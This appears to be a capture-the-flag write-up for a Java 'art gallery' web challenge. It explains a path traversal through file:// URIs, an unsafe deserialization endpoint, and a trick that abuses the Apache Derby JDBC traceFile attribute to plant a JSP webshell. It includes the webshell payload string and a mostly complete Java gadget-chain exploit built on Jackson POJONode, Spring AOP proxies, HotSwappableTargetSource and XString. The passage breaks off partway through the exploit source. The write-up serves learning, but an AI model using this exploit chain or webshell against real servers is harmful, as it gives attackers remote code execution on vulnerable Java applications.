@@ -1,0 +1,443 @@
+<p>Challenge Author: to016</p>
+
+<h2 id="overview">Overview</h2>
+
+<p>The challenge is pretty simple. When we connect to the challenge page, a simple web page is presented. The web page mimics the front page of an art gallery, but there is not so much to click on it.</p>
+
+<p>By looking at the network connections in the devtools we discover that the page is sending some network requests to <code class="language-plaintext highlighter-rouge">gallery/api/decompress?path=</code></p>
+
+<p>Interesting. Seems like that there is an endpoint that <mark style="background: #FFB86CA6;">decompress</mark> some images. Let’s look at it in the source code.</p>
+
+<p>Unfortunately, this is not that easy.</p>
+
+<h3 id="so-long-apache-tomcat">So Long Apache Tomcat</h3>
+
+<p>The challenge’s attachment is a zip file that contains all the file necessary to perform a self deployment.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.
+├── docker-compose.yml
+└── web/
+    ├── Dockerfile
+    ├── flag
+    ├── heavy_images/
+    ├── java.security
+    ├── readflag
+    └── src/
+        ├── apache-tomcat-9.0.89.zip
+        ├── gallery.war
+        └── jdk-15.0.2
+</code></pre></div></div>
+
+<p>As you can see, there is a Tomcat web server where the <code class="language-plaintext highlighter-rouge">.war</code> file is deployed. Fortunately for us the <code class="language-plaintext highlighter-rouge">.war</code> file is similar to a zip file, so we can easily extract it in order to get access to the sources.</p>
+
+<p>We can extract the <code class="language-plaintext highlighter-rouge">gallery.war</code> archive with a simple <code class="language-plaintext highlighter-rouge">unzip gallery.war</code>  or with <code class="language-plaintext highlighter-rouge">jar -xvf gallery.war</code></p>
+
+<p>After the extraction process, out directory structure will look like this. Notice that i’ve stripped the aforementioned files for brevity.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.
+└── web/
+    ├── src/
+    │   ├── WEB-INF/
+    │   │   ├── classes/
+    │   │   │   └── com/
+    │   │   │       └── gallery/
+    │   │   │           └── art/
+    │   │   │               ├── contorllers/
+    │   │   │               │   ├── ApiController.class
+    │   │   │               │   └── IndexController.class
+    │   │   │               ├── models/
+    │   │   │               │   └── ImageBean.class
+    │   │   │               ├── tools/
+    │   │   │               │   ├── CustomDataSource.class
+    │   │   │               │   ├── PathUtils.class
+    │   │   │               │   └── PendingDataSource.class
+    │   │   │               └── ArtGalleryApplication.class
+    │   │   └── lib/
+    │   │       └── ...
+
+</code></pre></div></div>
+
+<p>As you may notice, we don’t have <code class="language-plaintext highlighter-rouge">.java</code> files. Again is simple to retrieve those from the compiled <code class="language-plaintext highlighter-rouge">.class</code> files (fortunately).</p>
+
+<p>We can use the <code class="language-plaintext highlighter-rouge">jadx</code> decompiler, in order to perform this operation. Below there is a quick bash command that let you decompile these files.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> ./web/src/
+find ./WEB-INF/classes/com/galery/art/ <span class="nt">-type</span> f <span class="nt">-exec</span> find <span class="o">{}</span> <span class="nt">-type</span> f <span class="nt">-name</span> <span class="s2">"*.class"</span> <span class="se">\;</span> | xargs <span class="nt">-I</span> <span class="o">!</span> jadx <span class="nt">-d</span> decompiled <span class="o">!</span> <span class="nt">--comments-level</span> none 
+</code></pre></div></div>
+
+<p>The output of this command is a directory containing all the decompiled <code class="language-plaintext highlighter-rouge">.java</code> files, which now we can analyze.</p>
+
+<h2 id="java-challenge-means-deserialization">Java Challenge Means Deserialization</h2>
+
+<p>By looking at the source code, we can analyze the route for decompressing files, since it seems interesting.</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@RequestMapping</span><span class="o">({</span><span class="s">"/api"</span><span class="o">})</span>
+<span class="nd">@RestController</span>
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">ApiController</span> <span class="o">{</span>
+    <span class="nd">@GetMapping</span><span class="o">({</span><span class="s">"/decompress"</span><span class="o">})</span>
+    <span class="kd">public</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">index</span><span class="o">(</span><span class="nc">String</span> <span class="n">path</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="nc">String</span> <span class="n">processedPath</span> <span class="o">=</span> <span class="nc">PathUtils</span><span class="o">.</span><span class="na">canonicalPath</span><span class="o">(</span><span class="s">"file:///heavy_images/"</span> <span class="o">+</span> <span class="n">path</span><span class="o">);</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">processedPath</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="o">!</span><span class="n">processedPath</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">"file://"</span><span class="o">))</span> <span class="o">{</span>
+                <span class="k">return</span> <span class="s">"Invalid"</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(</span><span class="nc">StandardCharsets</span><span class="o">.</span><span class="na">UTF_8</span><span class="o">);</span>
+            <span class="o">}</span>
+            <span class="nc">FileUrlResource</span> <span class="n">fileUrlResource</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">FileUrlResource</span><span class="o">(</span><span class="k">new</span> <span class="no">URL</span><span class="o">(</span><span class="n">processedPath</span><span class="o">));</span>
+            <span class="nc">ByteArrayInputStream</span> <span class="n">byteArrayInputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ByteArrayInputStream</span><span class="o">(</span><span class="n">fileUrlResource</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">().</span><span class="na">readAllBytes</span><span class="o">());</span>
+            <span class="nc">InputStream</span> <span class="n">is</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">GZIPInputStream</span><span class="o">(</span><span class="n">byteArrayInputStream</span><span class="o">);</span>
+            <span class="nc">ObjectInputStream</span> <span class="n">sois</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ObjectInputStream</span><span class="o">(</span><span class="n">is</span><span class="o">);</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="nc">ImageBean</span> <span class="n">image</span> <span class="o">=</span> <span class="o">(</span><span class="nc">ImageBean</span><span class="o">)</span> <span class="n">sois</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+                <span class="kt">byte</span><span class="o">[]</span> <span class="n">returnData</span> <span class="o">=</span> <span class="n">image</span><span class="o">.</span><span class="na">getContent</span><span class="o">();</span>
+                <span class="n">sois</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+                <span class="k">return</span> <span class="n">returnData</span><span class="o">;</span>
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">return</span> <span class="s">"Error occurred"</span><span class="o">.</span><span class="na">getBytes</span><span class="o">();</span>
+            <span class="o">}</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">UnsupportedEncodingException</span> <span class="n">var10</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">var10</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">IOException</span> <span class="n">var11</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">var11</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>This routes does the following:</p>
+
+<ul>
+  <li>Concatenates a <code class="language-plaintext highlighter-rouge">path</code> parameter to <code class="language-plaintext highlighter-rouge">file:///heavy_images/</code></li>
+  <li>Checks if the processed path starts with <code class="language-plaintext highlighter-rouge">file://</code></li>
+  <li>If it’s true, read all bytes from the stream and unzip it with gzip</li>
+  <li>The decompressed file is then converted to an object, and the <code class="language-plaintext highlighter-rouge">readObject</code> method is called</li>
+</ul>
+
+<p>Really interesting! The route is essentially performing <mark style="background: #FFB86CA6;">deserialization</mark> of an object. The problem is that we can technically hit any path that we want due to a trivial path traversal, but we don’t have full control on the deserialized object.</p>
+
+<p>Or can we?</p>
+
+<h2 id="fallbacking-more-like-back-falling">Fallbacking? More like back falling</h2>
+
+<p>Think about it really careful.  The check is performed just on <code class="language-plaintext highlighter-rouge">file://</code> and not on <code class="language-plaintext highlighter-rouge">file:///</code>. After thinking about it i’ve started read the specification for the <a href="https://datatracker.ietf.org/doc/rfc8089/">file URI</a> and the wikipedia related page.</p>
+
+<p>Turns out that using <code class="language-plaintext highlighter-rouge">file:///</code> is the same as using <code class="language-plaintext highlighter-rouge">file://localhost/</code>. So essentially is fallbacking to localhost. This means that we can specify a remote host in order to retrieve a file from it.
+In the specification is also stated that the file URI can be used to instantiate remote connections to hosts.
+Personally i found this behaviour mind blowing. I didn’t know of this behaviour, and it’s wonderful to have learnt about it, even though seems like some really old behaviour.</p>
+
+<p>Back to our challenge, we can traverse the path back to the beginning of the URI just by using <code class="language-plaintext highlighter-rouge">../../ip:port/file</code>
+At this point we can import an arbitrary object that later on will be deserialized. It’s time to achieve RCE.</p>
+
+<h2 id="jdbc-and-apache-derby">JDBC and Apache Derby</h2>
+
+<p>Here is where the things are getting more interesting. I’ve always been thrilled by these kind of challenges, where do you need to find the gadgets. Even though this blogpost is another story of a reverse engineered exploit, i’ve learned a lot.</p>
+
+<p>Let’s star with analyzing the source code once again. We can deserialize an arbitrary object, so we need to chain objects in order to reach our goal, which is RCE.</p>
+
+<p>Reading the code once again we can find this:</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">java.sql.DriverManager</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.sql.SQLException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.derby.jdbc.ClientDriver</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.springframework.boot.SpringApplication</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.springframework.boot.autoconfigure.SpringBootApplication</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.springframework.boot.builder.SpringApplicationBuilder</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.springframework.boot.web.servlet.support.SpringBootServletInitializer</span><span class="o">;</span>
+
+<span class="nd">@SpringBootApplication</span>
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">ArtGaleryApplication</span> <span class="kd">extends</span> <span class="nc">SpringBootServletInitializer</span> <span class="o">{</span>
+    <span class="kd">static</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="nc">DriverManager</span><span class="o">.</span><span class="na">registerDriver</span><span class="o">(</span><span class="k">new</span> <span class="nc">ClientDriver</span><span class="o">());</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">SQLException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">throw</span> <span class="k">new</span> <span class="nf">RuntimeException</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="nc">SpringApplication</span><span class="o">.</span><span class="na">run</span><span class="o">(</span><span class="nc">ArtGaleryApplication</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">args</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">protected</span> <span class="nc">SpringApplicationBuilder</span> <span class="nf">configure</span><span class="o">(</span><span class="nc">SpringApplicationBuilder</span> <span class="n">builder</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="n">builder</span><span class="o">.</span><span class="na">sources</span><span class="o">(</span><span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">ArtGaleryApplication</span><span class="o">.</span><span class="na">class</span><span class="o">});</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>In the main file is registered a JDBC driver for <mark style="background: #FFB86CA6;">Apache Derby</mark>. The weird thing is that there is no derby server on the application. So this should be here for a reason.</p>
+
+<p>Among the other custom classes, there is another interesting class. The class is <code class="language-plaintext highlighter-rouge">CustomDataSource</code> and implements the <code class="language-plaintext highlighter-rouge">Serializable</code> interface.</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">CustomDataSource</span> <span class="kd">implements</span> <span class="nc">PendingDataSource</span><span class="o">,</span> <span class="nc">Serializable</span> <span class="o">{</span>
+    <span class="nc">String</span> <span class="n">conStr</span><span class="o">;</span>
+
+    <span class="kd">public</span> <span class="nc">Connection</span> <span class="nf">getConnection</span><span class="o">()</span> <span class="kd">throws</span> <span class="nc">SQLException</span> <span class="o">{</span>
+        <span class="nc">DriverManager</span><span class="o">.</span><span class="na">getConnection</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">conStr</span><span class="o">);</span>
+        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="nc">String</span> <span class="nf">getConStr</span><span class="o">()</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">conStr</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">int</span> <span class="nf">getLoginTimeout</span><span class="o">()</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="nc">ConnectionBuilder</span> <span class="nf">getConnectionBuilder</span><span class="o">()</span> <span class="kd">throws</span> <span class="nc">SQLException</span> <span class="o">{</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="nf">SQLFeatureNotSupportedException</span><span class="o">(</span><span class="s">"createConnectionBuilder not implemented"</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>The only useful method is <code class="language-plaintext highlighter-rouge">getConnection</code> which uses the <code class="language-plaintext highlighter-rouge">DriverManager.getConnection</code> method in order to instantiate a connection to a database, using JDBC. 
+Again this class is never used, so the things are getting interesting.</p>
+
+<p>At this point there are two things that we have discovered:</p>
+
+<ul>
+  <li>We can deserialize a <code class="language-plaintext highlighter-rouge">CustomDataSource</code> object, but it does not implement any <code class="language-plaintext highlighter-rouge">readObject</code> method</li>
+  <li>We have a register JDBC driver for Apache Derby. This allows us to connect with a non existent Derby server</li>
+</ul>
+
+<p>Sounds pretty useless right? We need to gather more information. After spending a bit of time through the Derby docs, you can find this <a href="https://db.apache.org/derby/docs/10.4/devguide/cdevdvlp17453.html">page</a>.</p>
+
+<p>There is defined the syntax used to connect to a Derby server via JDBC. Surprisingly we <a href="https://db.apache.org/derby/docs/10.10/ref/rrefattrib24612.html#rrefattrib24612">discover</a> that we can customize the behaviour of the connection by appending some <mark style="background: #FFB86CA6;">attributes</mark> to the URL.</p>
+
+<p>Skimming through those, there are a couple of outstanding ones:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">create=true</code> allows the creation of the database</li>
+  <li><code class="language-plaintext highlighter-rouge">traceFile=path</code> allows the creation of a file within will be logged the output</li>
+  <li><code class="language-plaintext highlighter-rouge">traceLevel=value</code> allows to specify how much will be logged</li>
+</ul>
+
+<p>Essentially during the connection to the database, if we specify those parameters, a file will be created with some logging information. 
+Due to the fact that the Derby Server does not exists the connection will be shortly after dropped, but the <mark style="background: #FFB86CA6;">file will be created</mark> regardless.</p>
+
+<p>If our connection information will be logged, we can theoretically embed a <mark style="background: #FFB86CA6;">webshell</mark> into our connection string. Thus will be logged and saved into the log file, leading to RCE.</p>
+
+<p>Indeed this is working. Using something like the following we can create a <code class="language-plaintext highlighter-rouge">.jsp</code> that executes system commands.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">jdbc</span><span class="p">:</span><span class="n">derby</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">myderby</span><span class="p">;</span><span class="n">create</span><span class="o">=</span><span class="n">true</span><span class="p">;</span><span class="n">traceFile</span><span class="o">=/</span><span class="n">path_to_tomcat</span><span class="o">/</span><span class="n">webapps</span><span class="o">/</span><span class="n">gallery</span><span class="o">/</span><span class="n">exploit</span><span class="p">.</span><span class="n">jsp</span><span class="p">;</span><span class="n">traceLevel</span><span class="o">=</span><span class="mi">35</span><span class="p">;</span><span class="o">&lt;%</span><span class="n">out</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">new</span> <span class="n">java</span><span class="p">.</span><span class="n">io</span><span class="p">.</span><span class="n">BufferedReader</span><span class="p">(</span><span class="n">new</span> <span class="n">java</span><span class="p">.</span><span class="n">io</span><span class="p">.</span><span class="n">InputStreamReader</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="n">getRuntime</span><span class="p">().</span><span class="k">exec</span><span class="p">(</span><span class="n">new</span> <span class="n">String</span><span class="p">[]{</span>\<span class="s">"/bin/bash</span><span class="se">\"</span><span class="s">, </span><span class="se">\"</span><span class="s">-c</span><span class="se">\"</span><span class="s">, </span><span class="se">\"</span><span class="s">id</span><span class="se">\"</span><span class="s">}).getInputStream())).readLine())</span><span class="se">\\</span><span class="s">u003b%&gt;=z
+</span></code></pre></div></div>
+
+<p>Credits for this payload goes to <mark style="background: #FFB86CA6;">@null001</mark>. It’s a really clever technique and it’s indeed powerful.</p>
+
+<h2 id="the-art-of-chaining">The art of chaining</h2>
+
+<p>Right now, we know that we can achieve RCE via Arbitrary Write. The next step is understand how to trigger the <code class="language-plaintext highlighter-rouge">getConnection</code> method, from the <code class="language-plaintext highlighter-rouge">CustomDataSource</code> class, with our payload.</p>
+
+<p>Essentially starting from a <code class="language-plaintext highlighter-rouge">readObject</code> method we need to land on a <code class="language-plaintext highlighter-rouge">get</code> method. We need what is called, in literature, a <mark style="background: #FFB86CA6;">kick-off</mark> gadget.
+After a bit of time of googling some stuff, i’ve came across <a href="https://github.com/LxxxSec/CTF-Java-Gadget">this repository</a>. In it there are a lot of useful gadgets, and after reading a bit of it i’ve found how we reach the getter method.</p>
+
+<p>I haven’t found a direct way to reach the getter method starting from the <code class="language-plaintext highlighter-rouge">readObject</code>, so we need actually two different gadgets:</p>
+
+<ul>
+  <li>The first one will call our getter method, by calling a <code class="language-plaintext highlighter-rouge">toString</code></li>
+  <li>The second one will call the <code class="language-plaintext highlighter-rouge">toString</code> method, by calling the <code class="language-plaintext highlighter-rouge">readObject</code> method (the kick-off gadget)</li>
+</ul>
+
+<p>As you can see we have constructed a chain of gadget that lead us to call the getter method.</p>
+
+<p>I’ve tried to make the process as clean as possible, but was not easy for me to came up with such idea. I’ve spent countless of hours in order to understand how the two gadgets were working. After that my first exploit wasn’t working due to some reason that are still a bit obscure right now.</p>
+
+<p>I’ve always been thrilled by such challenges, mainly by the fact that there are not so much resources in English regarding gadget finding. I’ve spent a lot of hours translating blog posts and writeups from Chinese. That’s why i’m still investing my time on it, because i think that have some English resources could be really helpful to someone.</p>
+
+<p>Back to the challenge, after a bit of copy and pasting the gadgets from the repo and reversing the author exploit (thank you @to016 for dealing with me), I’ve came up with a fully working exploit.</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">com.fasterxml.jackson.databind.node.POJONode</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javassist.ClassPool</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javassist.CtClass</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javassist.CtMethod</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.zip.GZIPInputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.zip.GZIPOutputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.springframework.aop.target.HotSwappableTargetSource</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.galery.art.tools.CustomDataSource</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.galery.art.tools.PendingDataSource</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.springframework.aop.framework.AdvisedSupport</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Main</span><span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span><span class="o">{</span>
+
+        <span class="cm">/**
+         * We know that we can reach a getter method starting from a readObject.
+         * The adopted technique is the following.
+         * Using POJONode we can call a getter method using a toString.
+         * Using &lt;insert&gt; we can call a toString method from a readObject.
+         * In this way we have created a gadget chain.
+         * 
+         * Let's start by creating the first part of the gadget chain. POJONode#toString -&gt; getter
+         * We leverage the use of javassist in order to work with java bytecode properly.
+         * We remove the writeReplace method in order to have a properly working gadget.
+         * In this way we remove an exception that obstacles us.
+         * 
+         * */</span> 
+
+	    <span class="nc">ClassPool</span> <span class="n">pool</span> <span class="o">=</span> <span class="nc">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">();</span>
+	    <span class="n">pool</span><span class="o">.</span><span class="na">appendClassPath</span><span class="o">(</span><span class="s">"/&lt;path-to-lib&gt;/jackson-databind-2.13.5.jar"</span><span class="o">);</span>
+	    <span class="nc">CtClass</span> <span class="n">ctClass0</span> <span class="o">=</span> <span class="n">pool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"com.fasterxml.jackson.databind.node.BaseJsonNode"</span><span class="o">);</span>
+        <span class="nc">CtMethod</span> <span class="n">writeReplace</span> <span class="o">=</span> <span class="n">ctClass0</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">"writeReplace"</span><span class="o">);</span>
+        <span class="n">ctClass0</span><span class="o">.</span><span class="na">removeMethod</span><span class="o">(</span><span class="n">writeReplace</span><span class="o">);</span>
+        <span class="nc">ClassLoader</span> <span class="n">classLoader</span> <span class="o">=</span> <span class="nc">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getContextClassLoader</span><span class="o">();</span>
+        <span class="n">ctClass0</span><span class="o">.</span><span class="na">toClass</span><span class="o">(</span><span class="n">classLoader</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+
+
+        <span class="cm">/**
+         * Let's now create the class on which we want to call the getter method.
+         * With the setFieldValue method we set the conStr field with our payload.
+         * The payload instanties a connection to a derby server (which doesn't exists in our case).
+         * We can leverage the usage of attributes for the connection in order to create a log file.
+         * The parameter is traceFile.
+         * In this log file there will be our webshell. How? By simply adding it after the connection.
+         * This will be simply logged to the file.
+         * 
+         * There is just one caveat. We need to adjust the log tracing level in order to reduce the amount of junk outputted to the log file.
+         * After trying and error, it's ok to have an error tracing level around 32 to 35
+         *  
+         * */</span> 
+
+        <span class="nc">CustomDataSource</span> <span class="n">getterClass</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">CustomDataSource</span><span class="o">();</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">getterClass</span><span class="o">,</span><span class="s">"conStr"</span><span class="o">,</span><span class="s">"jdbc:derby://127.0.0.1:8080/tmp/myderby;create=true;traceFile=/&lt;path-to-tomcat&gt;/webapps/gallery/exploit.jsp;traceLevel=35;&lt;%out.write(new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(new String[]{\"/bin/bash\", \"-c\", \"id\"}).getInputStream())).readLine())\\u003b%&gt;=zz"</span><span class="o">);</span>
+
+        <span class="cm">/**
+         *  We can now create our POJONode class with our getterClass embedded.
+         *  We need to wrap the getterClass around a Proxy. This gadget is called JacksonReadObject2GetterBetter.
+         *  The standard gadget is not working, due to some exception being thrown.
+         * 
+         * */</span> 
+
+	    <span class="nc">POJONode</span> <span class="n">toStringClass</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">POJONode</span><span class="o">(</span><span class="n">makeTemplatesImplAopProxy</span><span class="o">(</span><span class="n">getterClass</span><span class="o">));</span>
+
+        <span class="cm">/**
+         * Now we have a fully working chain from a toString method to a getter method.
+         * We need to build the rest of the chain.
+         * At the beginning i thought about using BadAttributeValueExpException#readObject -&gt; toString gadget.
+         * However this is no longer possible to use due to the JDK not allowing it.
+         * 
+         * I've tried also with EventListenerList#readObject -&gt; toString but even that was not working due to some corruption.
+         * 
+         * So the final gadget used is HashMap#readObject -&gt; HotSwappableTargetSource#equals -&gt; XString#equals -&gt; toString.
+         * Which is a bit longer but it's indeed working.
+         * 
+         */</span>
+
+
+        <span class="c1">// We cannot instantiate XString here due to some road blocks. We can find this workaround however.</span>
+        <span class="nc">Class</span> <span class="n">cls</span> <span class="o">=</span> <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"com.sun.org.apache.xpath.internal.objects.XString"</span><span class="o">);</span>
+        <span class="nc">Constructor</span> <span class="n">constructor</span> <span class="o">=</span> <span class="n">cls</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+        <span class="n">constructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+
+        <span class="nc">HotSwappableTargetSource</span> <span class="n">hotSwappableTargetSource1</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HotSwappableTargetSource</span><span class="o">(</span><span class="n">toStringClass</span><span class="o">);</span>
+        <span class="nc">HotSwappableTargetSource</span> <span class="n">hotSwappableTargetSource2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HotSwappableTargetSource</span><span class="o">(</span><span class="n">constructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="s">"1"</span><span class="o">));</span>
+        <span class="nc">HashMap</span> <span class="n">hashMap</span> <span class="o">=</span> <span class="n">makeMap</span><span class="o">(</span><span class="n">hotSwappableTargetSource1</span><span class="o">,</span> <span class="n">hotSwappableTargetSource2</span><span class="o">);</span>
+
+        <span class="nc">FileOutputStream</span> <span class="n">fos</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">FileOutputStream</span><span class="o">(</span><span class="s">"exploit.bin"</span><span class="o">);</span>
+        <span class="nc">GZIPOutputStream</span> <span class="n">gzipOS</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">GZIPOutputStream</span><span class="o">(</span><span class="n">fos</span><span class="o">);</span>
+        <span class="nc">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ObjectOutputStream</span><span class="o">(</span><span class="n">gzipOS</span><span class="o">);</span>
+        <span class="n">oos</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">hashMap</span><span class="o">);</span>
+        <span class="n">oos</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="nc">Object</span> <span class="nf">makeTemplatesImplAopProxy</span><span class="o">(</span><span class="nc">CustomDataSource</span> <span class="n">templates</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+        <span class="nc">AdvisedSupport</span> <span class="n">advisedSupport</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">AdvisedSupport</span><span class="o">();</span>
+        <span class="n">advisedSupport</span><span class="o">.</span><span class="na">setTarget</span><span class="o">(</span><span class="n">templates</span><span class="o">);</span>
+        <span class="nc">Constructor</span> <span class="n">constructor</span> <span class="o">=</span> <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"org.springframework.aop.framework.JdkDynamicAopProxy"</span><span class="o">).</span><span class="na">getConstructor</span><span class="o">(</span><span class="nc">AdvisedSupport</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+        <span class="n">constructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="nc">InvocationHandler</span> <span class="n">handler</span> <span class="o">=</span> <span class="o">(</span><span class="nc">InvocationHandler</span><span class="o">)</span> <span class="n">constructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">advisedSupport</span><span class="o">);</span>
+        <span class="nc">Object</span> <span class="n">proxy</span> <span class="o">=</span> <span class="nc">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span><span class="nc">ClassLoader</span><span class="o">.</span><span class="na">getSystemClassLoader</span><span class="o">(),</span> <span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">PendingDataSource</span><span class="o">.</span><span class="na">class</span><span class="o">},</span> <span class="n">handler</span><span class="o">);</span>
+        <span class="k">return</span> <span class="n">proxy</span><span class="o">;</span>
+    <span class="o">}</span>
+
